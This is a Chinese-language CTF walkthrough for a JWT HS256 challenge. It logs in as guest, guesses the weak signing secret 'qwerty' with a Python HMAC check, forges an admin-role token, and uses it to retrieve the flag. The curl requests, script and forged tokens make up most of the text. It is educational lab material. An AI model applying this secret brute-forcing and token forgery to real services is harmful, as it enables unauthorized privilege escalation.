# 13-brute-jwt-hs256 手工复刻

## 题目地址

```text
http://目标地址/
```

## 1. 看首页提示

首页写得很清楚：

- 登录接口：`POST /api/login`
- 默认账号：`guest / guest`
- 受保护接口：`GET /admin/flag`
- 需要 JWT 里面的 `role=admin`
- JWT 算法是 `HS256`

## 2. 登录拿 guest token

```bash
curl -s -X POST 'http://目标地址/api/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"guest","password":"guest"}'
```

返回：

```json
{
  "ok": true,
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIn0.VDVJ75eJY7xBCFM2T29a9CMqLPIO4XX_KpvkzrM7qjc"
}
```

记下 token：

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIn0.VDVJ75eJY7xBCFM2T29a9CMqLPIO4XX_KpvkzrM7qjc
```

## 3. 解码 JWT

JWT 分三段：

```text
header.payload.signature
```

把前两段 base64url 解码后是：

Header：

```json
{ "alg": "HS256", "typ": "JWT" }
```

Payload：

```json
{ "sub": "guest", "role": "user" }
```

关键点：当前是 `role=user`，目标是改成 `role=admin`。

## 4. 爆破 HS256 密钥

HS256 是对称签名，只要密钥弱，就可以离线爆破。

用常见弱口令测试后命中：

```text
qwerty
```

验证逻辑：

```python
import base64, hmac, hashlib

jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIn0.VDVJ75eJY7xBCFM2T29a9CMqLPIO4XX_KpvkzrM7qjc'
header, payload, sig = jwt.split('.')
secret = 'qwerty'
calc = base64.urlsafe_b64encode(
    hmac.new(secret.encode(), f'{header}.{payload}'.encode(), hashlib.sha256).digest()
).rstrip(b'=').decode()
print(calc == sig)
```

输出 `True` 就说明密钥正确。

## 5. 伪造 admin token

把 payload 改成：

```json
{ "sub": "guest", "role": "admin" }
```

再用密钥 `qwerty` 做 HS256 签名，得到：

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG1pbiJ9.FWMLbiVd-B9bRuJb-Ai4jM7yCeK15QDGXSFE7ImOVuU
```

## 6. 带伪造 token 访问 flag

```bash
curl -s 'http://目标地址/admin/flag' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG1pbiJ9.FWMLbiVd-B9bRuJb-Ai4jM7yCeK15QDGXSFE7ImOVuU'
```

返回：

```json
{ "flag": "TOGOGO-flag{}", "ok": true }
```
